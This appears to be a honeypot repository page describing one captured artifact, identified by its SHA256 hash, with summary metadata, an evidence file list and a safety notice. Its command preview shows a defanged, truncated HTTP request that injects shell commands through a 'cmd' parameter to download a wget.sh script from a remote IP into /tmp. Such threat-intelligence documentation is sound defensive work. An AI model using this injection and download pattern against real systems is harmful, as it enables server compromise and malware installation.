# 93098d66ee3bfbd6407e736425fbd53a43b89d534259092bb4128a3a46a07acd

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `93098d66ee3bfbd6407e736425fbd53a43b89d534259092bb4128a3a46a07acd` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /config/?cmd=cd%20/tmp%3Brm%20-f%20.s%3Bwget%20hxxp://91[.]92[.]40[.]XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20hxxp://91[.]92
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
